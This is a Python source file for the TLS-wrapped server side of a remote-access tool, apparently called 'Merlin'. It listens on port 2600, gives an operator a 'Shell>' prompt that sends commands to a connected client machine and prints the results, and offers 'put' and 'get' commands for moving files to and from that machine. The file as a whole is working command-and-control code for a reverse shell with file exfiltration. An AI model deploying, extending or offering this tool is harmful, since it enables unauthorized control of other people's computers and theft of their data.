import socket
import ssl
import subprocess
import signal
import sys
import time
import os

HOST = '0.0.0.0'  
PORT = 2600     
CERTFILE = 'merlin_server.crt'  
KEYFILE = 'merlin_server.key'   

# Incoming socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(5)

context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile=CERTFILE, keyfile=KEYFILE)

server_socket = context.wrap_socket(server_socket, server_side=True)

print(f"[+] Waiting for incoming connections on {HOST}:{PORT}...")

# If SIGINT (Ctrl+C)
def signal_handler(sig, frame):
    print("\n[+] Server stopping...")
    server_socket.shutdown(socket.SHUT_RDWR)
    server_socket.close()  
    time.sleep(1)
    sys.exit(0)

# Check if client is connected before sending commands
def is_client_connected(client_socket):   
    try:
        client_socket.send(b'')  
        return True
    except socket.error:
        return False

def execute_command(command, client_socket):
    try:
        client_socket.send(command.encode())
        
        client_socket.settimeout(2)

        response = client_socket.recv(1024).decode()
        
        if response:
            return response
        else:
            return "No response from client."
        
    except Exception as e:
        return f"Command execution Error : {str(e)}"

while True:
    # Accept incoming connections
    client_socket, client_address = server_socket.accept()
    print(f"[+] Connection established with {client_address}")
    
    while True:  
        if not is_client_connected(client_socket):  
            print("[-] Client has disconnected.")
            client_socket.close()
            break  

        command = input("Shell> ")

        if command.lower() == 'exit':
            client_socket.send(command.encode())  
            client_socket.close()
            print(f"[+] Server Socket Closed !")
            break  

        if command.startswith('put '):           
            client_socket.send(command.encode())
            
            _, filepath = command.split(maxsplit=1)
            try:
                with open(filepath, 'rb') as f:
                    # Read and send file in chunks
                    while chunk := f.read(1024):
                        client_socket.send(chunk)
                    client_socket.send(b'EOF')
                    
                print(f"[+] File {filepath} sent successfully.")
            except FileNotFoundError:
                print(f"[-] File {filepath} not found !")
            continue  

        if command.startswith('get '):       
            client_socket.send(command.encode())

            _, filename = command.split(maxsplit=1)
            try:
                with open(filename, 'wb') as f:
                    while True:
                        chunk = client_socket.recv(1024)
                        if chunk == b'EOF':
                            break
                        f.write(chunk)
                print(f"[+] File {filename} received successfully.")
            except Exception as e:
                print(f"[-] Error during file transfer : {e}")
            continue  

        # Exécution de la commande sur le client
        response = execute_command(command, client_socket)
        
        print(response)  # Afficher la réponse du serveur
